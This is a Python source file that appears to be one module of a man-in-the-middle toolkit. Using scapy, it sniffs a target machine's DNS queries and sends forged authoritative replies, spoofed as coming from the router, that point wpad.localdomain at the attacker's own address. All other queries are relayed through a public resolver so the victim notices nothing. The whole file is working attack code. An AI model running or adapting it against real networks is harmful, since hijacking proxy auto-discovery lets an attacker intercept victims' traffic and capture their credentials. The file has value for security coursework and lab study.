"""
Fake DNS server that will poison the response for wpad.localdomain
"""

from scapy.all import IP, DNSQR, DNSRR, DNS, sniff, conf, UDP, send, sr1
from termcolor import cprint

WPAD_HOSTNAME = 'wpad.localdomain'
GOOGLE_DNS = '8.8.8.8'


def _make_handler(attacker_ip, router_ip, target_ip):
    def _poison_response(pkt):
        original_qname = pkt[DNSQR].qname

        if WPAD_HOSTNAME in str(original_qname):
            fake_pkt = IP()/UDP()/DNS()/DNSRR()

            # Reply appears to come from the real router so the client trusts it
            fake_pkt[IP].src = router_ip
            fake_pkt[IP].dst = target_ip

            fake_pkt[UDP].sport = 53
            fake_pkt[UDP].dport = pkt[UDP].sport

            # https://mislove.org/teaching/cs4700/spring11/handouts/project1-primer.pdf
            fake_pkt[DNS].id = pkt[DNS].id
            fake_pkt[DNS].qd = pkt[DNS].qd
            fake_pkt[DNS].aa = 1   # authoritative
            fake_pkt[DNS].qr = 1   # response
            fake_pkt[DNS].ancount = 1

            fake_pkt[DNSRR].rrname = WPAD_HOSTNAME + '.'
            fake_pkt[DNSRR].rdata = attacker_ip

            cprint(f'[DNS] Spoofed {WPAD_HOSTNAME} -> {attacker_ip}', 'light_red', attrs=['dark'])
            send(fake_pkt, verbose=0)

        else:
            # Forward non-WPAD queries to Google DNS and relay the reply
            fwd = IP()/UDP()/DNS()
            fwd[IP].dst = GOOGLE_DNS
            fwd[UDP].sport = pkt[UDP].sport
            fwd[DNS].rd = 1
            fwd[DNS].qd = DNSQR(qname=original_qname)

            google_resp = sr1(fwd, verbose=0, timeout=3)
            if google_resp is None:
                return

            relay = IP()/UDP()/DNS()
            relay[IP].src = router_ip
            relay[IP].dst = target_ip
            relay[UDP].dport = pkt[UDP].sport
            relay[DNS] = google_resp[DNS]
            send(relay, verbose=0)

    return _poison_response


def run(router_ip, target_ip, interface):
    attacker_ip = conf.ifaces[interface].ip

    cprint('*** Fake DNS server running ***', 'red', attrs=['blink', 'reverse'])

    bpf_filter = (
        f'udp dst port 53 '
        f'and src host {target_ip} '
        f'and not src host {attacker_ip}'
    )

    sniff(prn=_make_handler(attacker_ip, router_ip, target_ip),
          filter=bpf_filter, iface=interface)
